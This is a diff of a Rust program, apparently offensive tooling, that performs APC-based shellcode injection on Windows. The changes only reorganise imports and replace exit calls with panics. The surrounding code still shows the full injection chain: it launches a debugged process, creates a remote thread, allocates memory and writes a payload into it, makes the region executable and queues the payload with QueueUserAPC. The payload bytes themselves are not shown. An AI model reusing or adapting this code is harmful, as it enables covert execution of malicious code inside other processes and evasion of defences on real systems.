@@ -1,16 +1,20 @@
 use std::ffi::c_void;
-use std::process::exit;
-use std::ptr::{null, null_mut};
-use windows::core::{s, PSTR};
-use windows::Win32::Foundation::CloseHandle;
-use windows::Win32::System::Diagnostics::Debug::{DebugActiveProcessStop, WriteProcessMemory};
-use windows::Win32::System::Memory::{
-    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-};
-use windows::Win32::System::Threading::{
-    CreateProcessA, CreateRemoteThread, QueueUserAPC, SleepEx, DEBUG_PROCESS, INFINITE,
-    PROCESS_INFORMATION, STARTUPINFOA,
+use windows::{
+    core::{s, PSTR},
+    Win32::{
+        Foundation::CloseHandle,
+        System::{
+            Diagnostics::Debug::{DebugActiveProcessStop, WriteProcessMemory},
+            Memory::{
+                VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+            },
+            Threading::{
+                CreateProcessA, CreateRemoteThread, QueueUserAPC, SleepEx, DEBUG_PROCESS, INFINITE,
+                PROCESS_INFORMATION, STARTUPINFOA,
+            },
+        },
+    },
 };
 
 fn main() {
@@ -52,31 +56,19 @@ fn main() {
             None,
             &mut si,
             &mut pi,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateProcessA Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateProcessA Failed With Error: {e}");
         });
 
         let hprocess = pi.hProcess;
 
-        let hthread = CreateRemoteThread(
-            hprocess,
-            Some(null()),
-            0,
-            Some(function),
-            Some(null()),
-            0,
-            Some(null_mut()),
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateRemoteThread Failed With Error: {e}");
-            exit(-1);
+        let hthread = CreateRemoteThread(hprocess, None, 0, Some(function), None, 0, None).unwrap_or_else(|e| {
+            panic!("[!] CreateRemoteThread Failed With Error: {e}");
         });
 
         let address = VirtualAllocEx(
             hprocess,
-            Some(null()),
+            None,
             payload.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
@@ -88,10 +80,8 @@ fn main() {
             payload.as_ptr() as _,
             payload.len(),
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] WriteProcessMemory Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] WriteProcessMemory Failed With Error: {e}");
         });
 
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
@@ -101,10 +91,8 @@ fn main() {
             payload.len(),
             PAGE_EXECUTE_READWRITE,
             &mut oldprotect,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtectEx Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] VirtualProtectEx Failed With Error: {e}");
         });
 
         QueueUserAPC(std::mem::transmute(address), hthread, 0);
